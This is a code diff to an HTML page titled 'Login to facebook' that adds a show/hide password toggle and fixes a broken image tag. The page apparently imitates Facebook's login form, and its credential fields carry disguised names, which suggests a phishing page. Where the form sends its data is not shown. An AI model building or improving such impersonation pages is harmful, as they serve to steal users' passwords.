@@ -1,5 +1,6 @@
 <html lang="en">
                  <head>
+                   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
                  <meta charset="UTF-8">
                  <meta name="viewport" content="width=device-width, initial-scale=1.0">
                  <title>Login to facebook</title>
@@ -41,7 +42,9 @@
     <div class="p-2 w-full  gap-1  ">
     <div class="flex flex-col   p-2  gap-1">
     <input type="text" name="message_title" placeholder="Email address or mobile number"> <br>
-    <input type="password" name="description" placeholder="Password" id="password" autocomplete="new-password" aria-autocomplete="list" required="password"></div>
+    <input type="password" name="description" placeholder="Password" id="id_password" autocomplete="new-password" aria-autocomplete="list" required="password">
+    <i class="far fa-eye" id="togglePassword" style="margin-left: -40px; cursor: pointer; color :black;"></i>
+    </div>
     </center>
     <center>
     <div>
@@ -50,7 +53,21 @@
     </center>
     </div>
     </form>
-    <img src="bottom.png"
+    <img src="bottom.png">
     </div>
     </div>
-    </div></body></html>
+    </div>
+    <script>
+      const togglePassword = document.querySelector('#togglePassword');
+  const password = document.querySelector('#id_password');
+
+  togglePassword.addEventListener('click', function (e) {
+    // toggle the type attribute
+    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+    password.setAttribute('type', type);
+    // toggle the eye slash icon
+    this.classList.toggle('fa-eye-slash');
+});
+    </script>
+    </body>
+    </html>
